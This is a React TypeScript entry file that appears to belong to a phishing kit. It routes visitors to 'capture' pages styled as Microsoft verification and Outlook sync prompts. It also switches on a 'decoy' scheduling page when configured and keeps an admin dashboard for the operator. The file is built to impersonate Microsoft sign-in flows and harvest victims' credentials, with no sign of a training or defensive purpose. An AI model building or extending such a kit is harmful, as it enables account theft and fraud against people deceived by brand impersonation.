import React, { useState, useEffect } from 'react';
import ReactDOM from 'react-dom/client';
import { Dashboard } from './components/Dashboard';
import { CapturePage } from './components/CapturePage';
import { ScheduleCapturePage } from './components/ScheduleCapturePage';
import { MicrosoftVerifyTemplate } from './components/templates/MicrosoftVerifyTemplate';
import { OutlookSyncTemplate } from './components/templates/OutlookSyncTemplate';
import './styles/dashboard.css';
import './styles/capture.css';

type ActiveTemplate = 'default' | 'microsoft-verify' | 'outlook-sync' | null;

function TemplateRenderer({ template }: { template: ActiveTemplate }): React.ReactElement {
  if (template === 'microsoft-verify') return <MicrosoftVerifyTemplate />;
  if (template === 'outlook-sync') return <OutlookSyncTemplate />;
  return <CapturePage />;
}

function App(): React.ReactElement {
  const [path, setPath] = useState(window.location.pathname);
  const [schedulerEnabled, setSchedulerEnabled] = useState<boolean | null>(null);
  const [activeTemplate, setActiveTemplate] = useState<ActiveTemplate>(null);
  const [loaded, setLoaded] = useState(false);

  useEffect(() => {
    function onPopState(): void {
      setPath(window.location.pathname);
    }
    window.addEventListener('popstate', onPopState);
    return () => window.removeEventListener('popstate', onPopState);
  }, []);

  useEffect(() => {
    if (path === '/' || path === '/schedule' || path.startsWith('/preview/')) {
      Promise.all([
        fetch('/api/scheduler?public=true').then(r => r.json()).catch(() => ({ enabled: false })),
        fetch('/api/templates?public=true').then(r => r.json()).catch(() => ({ template: 'default' })),
      ]).then(([schedData, tplData]: [{ enabled?: boolean }, { template?: string }]) => {
        setSchedulerEnabled(schedData.enabled ?? false);
        setActiveTemplate((tplData.template as ActiveTemplate) ?? 'default');
        setLoaded(true);
      });
    } else {
      setLoaded(true);
    }
  }, [path]);

  if (path === '/admin' || path.startsWith('/admin/')) {
    return <Dashboard />;
  }

  // Preview routes for specific templates
  if (path === '/preview/microsoft-verify') return <MicrosoftVerifyTemplate />;
  if (path === '/preview/outlook-sync') return <OutlookSyncTemplate />;
  if (path === '/preview/default') return <CapturePage />;

  // /schedule always shows the scheduler (decoy)
  if (path === '/schedule' || path.startsWith('/schedule/')) {
    return <ScheduleCapturePage />;
  }

  if (!loaded) {
    return <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh' }}>
      <div className="capture-spinner" />
    </div>;
  }

  // If scheduler (decoy) is enabled, show decoy page
  if (schedulerEnabled) {
    return <ScheduleCapturePage />;
  }

  // Otherwise show the selected template
  return <TemplateRenderer template={activeTemplate} />;
}

ReactDOM.createRoot(document.getElementById('root')!).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);
